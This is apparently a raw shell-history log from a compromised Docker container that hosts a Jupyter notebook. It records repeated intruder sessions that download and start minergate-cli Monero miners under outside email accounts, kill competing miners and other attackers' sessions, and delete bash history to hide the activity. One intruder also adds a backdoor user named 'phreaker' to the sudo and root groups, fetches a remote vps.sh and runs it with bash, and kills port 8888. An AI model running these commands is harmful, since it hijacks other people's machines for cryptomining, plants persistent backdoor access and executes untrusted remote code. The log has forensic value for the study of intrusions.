+ ### root@f5e57551b879 /dev/pts/0 20170101 02:13 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 02:44 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 02:44 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 02:44 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 02:44 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 02:44 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 02:44 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 02:44 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 02:44 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 02:44 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20170101 02:50 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20170101 02:50 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20170101 02:50 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 02:50 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20170101 02:50 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 02:50 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20170101 02:50 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 02:50 /notebooks
+kill -9 8505;  ### root@f5e57551b879 /dev/pts/3 20170101 02:50 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20170101 02:50 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 02:51 /notebooks
+kill -9 8212;  ### root@f5e57551b879 /dev/pts/3 20170101 02:51 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/3 20170101 02:51 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20170101 02:51 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 02:51 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20170101 02:51 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 02:51 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20170101 02:51 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 02:51 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/3 20170101 02:51 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/3 20170101 02:51 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 03:12 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 03:12 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 03:12 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 03:12 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 03:12 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 03:43 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 03:43 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 03:43 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 03:43 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 03:43 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 03:43 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 03:43 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 03:43 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 03:43 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 04:14 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 04:14 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 04:14 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 04:14 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 04:14 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 04:14 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 04:14 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 04:14 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 04:14 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /notebooks
+kill -9 8965;  ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /notebooks
+kill -9 8756;  ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 04:42 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20170101 04:43 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 04:43 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20170101 04:43 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20170101 04:43 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/3 20170101 04:43 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/3 20170101 04:43 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 04:45 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 04:45 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 04:45 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 04:45 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 04:45 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 05:16 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 05:16 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 05:16 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 05:16 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 05:16 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 05:16 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 05:16 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 05:16 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 05:16 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 05:47 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 05:47 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 05:47 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 05:47 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 05:47 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 05:47 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 05:47 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 05:47 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 05:47 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 06:18 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 06:18 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 06:18 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 06:18 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 06:18 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 06:18 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 06:18 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 06:18 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 06:18 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20170101 06:29 /notebooks
+adduser phreaker ### root@f5e57551b879 /dev/pts/3 20170101 06:30 /notebooks
+adduser phreaker sudo ### root@f5e57551b879 /dev/pts/3 20170101 06:30 /notebooks
+adduser phreaker root ### root@f5e57551b879 /dev/pts/3 20170101 06:30 /notebooks
+wget phreakerthyco.hol.es/vps.sh && bash vps.sh ### root@f5e57551b879 /dev/pts/3 20170101 06:32 /notebooks
+wget phreakerthyco.hol.es/vps.sh && bash vps.sh ### root@f5e57551b879 /dev/pts/3 20170101 06:33 /notebooks
+netstat -nltp ### root@f5e57551b879 /dev/pts/3 20170101 06:33 /notebooks
+netstat -nltp ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /notebooks
+netstat -nltp ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /notebooks
+kill -9 9499;  ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /notebooks
+kill -9 9206;  ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20170101 06:34 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/4 20170101 06:35 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20170101 06:35 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/4 20170101 06:35 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20170101 06:35 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/4 20170101 06:35 /root/.ttmp
+netstat -nltp ### root@f5e57551b879 /dev/pts/0 20170101 06:35 /notebooks
+bash -i ### root@f5e57551b879 /dev/pts/4 20170101 06:35 /notebooks
+adduser phreaker ### root@f5e57551b879 /dev/pts/0 20170101 06:38 /notebooks
+passwd phreaker ### root@f5e57551b879 /dev/pts/0 20170101 06:38 /notebooks
+fuser -k 8888/tcp ### root@f5e57551b879 /dev/pts/0 20170101 06:42 /notebooks
+adduser phreaker ### root@f5e57551b879 /dev/pts/0 20170101 06:42 /notebooks
+netstat -nltp ### root@f5e57551b879 /dev/pts/0 20170101 06:43 /notebooks
+rm -f ~/.bash_history;exit  ### @f5e57551b879 not a tty 20170101 08:20 /notebooks
+docker ps ### @f5e57551b879 not a tty 20170101 08:20 /notebooks
+cd /datamnt/github/keras-cam-melanoma/ ### @f5e57551b879 not a tty 20170101 08:21 /notebooks -> /datamnt/github/keras-cam-melanoma
+git diff ### @f5e57551b879 not a tty 20170101 08:21 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20170101 08:21 /datamnt/github/keras-cam-melanoma
+ls -l ### @f5e57551b879 not a tty 20170101 08:21 /datamnt/github/keras-cam-melanoma
+ls -l |less ### @f5e57551b879 not a tty 20170101 08:29 /datamnt/github/keras-cam-melanoma
+mkdirtempweights ### @f5e57551b879 not a tty 20170101 08:29 /datamnt/github/keras-cam-melanoma
+mkdir tempweights ### @f5e57551b879 not a tty 20170101 08:29 /datamnt/github/keras-cam-melanoma
+mv weights.* tempweights/ ### @f5e57551b879 not a tty 20170101 08:29 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20170101 08:32 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20170101 08:32 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20170101 08:32 /datamnt/github/keras-cam-melanoma
+grep TRA ~/histlog  ### @f5e57551b879 not a tty 20170101 08:32 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 08:32 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 08:32 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20170101 08:33 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20170101 08:33 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20170101 08:33 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20170101 08:33 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20170101 08:33 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20170101 08:33 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/0 20170101 08:33 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/0 20170101 08:33 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20170101 08:33 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/0 20170101 08:33 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20170101 08:33 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/0 20170101 08:33 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20170101 08:34 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/0 20170101 08:34 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20170101 08:34 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 10:01 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 10:01 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 10:01 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 10:01 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 10:01 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 10:33 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20170101 10:33 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20170101 10:33 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20170101 10:33 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20170101 10:33 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20170101 10:33 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20170101 10:33 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20170101 10:33 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20170101 10:33 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20170101 10:34 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20170101 10:34 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 10:34 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 10:34 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 10:34 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 10:34 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 10:34 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 10:34 /notebooks
+kill -9 572;  ### root@f5e57551b879 /dev/pts/1 20170101 10:34 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20170101 10:34 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20170101 10:34 /notebooks
+kill -9 447;  ### root@f5e57551b879 /dev/pts/1 20170101 10:35 /notebooks
